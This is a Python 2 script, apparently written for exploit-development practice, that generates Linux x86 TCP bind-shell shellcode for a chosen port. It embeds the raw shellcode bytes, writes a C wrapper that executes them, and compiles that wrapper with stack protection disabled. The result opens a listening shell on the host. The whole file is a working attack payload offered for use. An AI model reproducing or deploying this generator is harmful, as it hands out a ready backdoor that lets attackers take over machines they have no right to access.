#!/usr/bin/env python
import sys
import re
import os
 
# Colorz
RED = "\x1B[1;31m"
BLU = "\x1B[1;34m"
GRE = "\x1B[1;32m"
RST = "\x1B[0;0;0m"
 
# Lambda
info_message = lambda x: '{}[*]{} {}'.format(BLU, RST, x)
suce_message = lambda x: '{}[+]{} {}'.format(GRE, RST, x)
erro_message = lambda x: '{}[-]{} {}'.format(RED, RST, x)
 
# Core
print info_message('Linux x86 TCP bind shell (v1.0)')
print info_message('Author {}Amonsec{}\n'.format(RED, RST))
if len(sys.argv) < 2:
	print info_message('Usage: python {} <local port>'.format(sys.argv[0]))
	sys.exit(0)
 
port = int(sys.argv[1])
if port < 1 or port > 65535 :
	print erro_message('You\'re drunk. Go home. Go home')
	sys.exit(0)
 
 
if len(hex(port).split('x')[1]) < 4:
	port = '0' + hex(port).split('x')[1]
else:
	port = hex(port).split('x')[1]
 
hexchain = ''
for x in re.findall('..', port):
	if x == '00':
		print erro_message('Null byte detected')
		sys.exit(0)
	hexchain += '\\x' + x
 
print suce_message('Hexchain port: {}'.format(hexchain))
 
shellcode = (
"\\x31\\xdb\\xb3\\x01\\x31\\xd2\\x31\\xc9\\x52\\x53\\x6a"
"\\x02\\x89\\xe1\\x31\\xc0\\xb0\\x66\\xcd\\x80\\x96\\x43"
"\\x52\\x66\\x68" + hexchain + 
"\\x66\\x53\\x89\\xe1\\x6a\\x10"
"\\x51\\x56\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x52\\x43\\x43"
"\\x53\\x56\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x43\\x52\\x52"
"\\x56\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x93\\x31\\xc9\\xb0"
"\\x3f\\xcd\\x80\\x41\\x83\\xf9\\x03\\x75\\xf6\\x52\\x68"
"\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3"
"\\x89\\xd1\\xb0\\x0b\\xcd\\x80")
 
print suce_message('Your shellcode:\n')
print shellcode.format('hex')
print ''
print info_message('Creating the C file ...')
 
filename = 'bind_shell_linux_x86.c'
content = ''
content += '#include <stdio.h>\n'
content += '#include <string.h>\n'
content += 'unsigned char shellcode[] = \\ \n'
content += '"' + shellcode + '";\n'
content += 'int main() {\n'
content += 'int (*ret)() = (int(*)())shellcode;\n'
content += 'ret();\n'
content += '}\n'
 
data = open(filename, 'w')
data.write(content)
data.close()
print suce_message('C file successfully created.')
 
print info_message('Compiling the C file ...')
try:
	os.system('gcc -fno-stack-protector bind_shell_linux_x86.c -o bind_shell_linux_x86')
except Exception:
	print erro_message('Error with the compilation')
	sys.exit(1)
print suce_message('C file successfully compiled.')
print suce_message('You are good to go 1337')
print ''
sys.exit(0)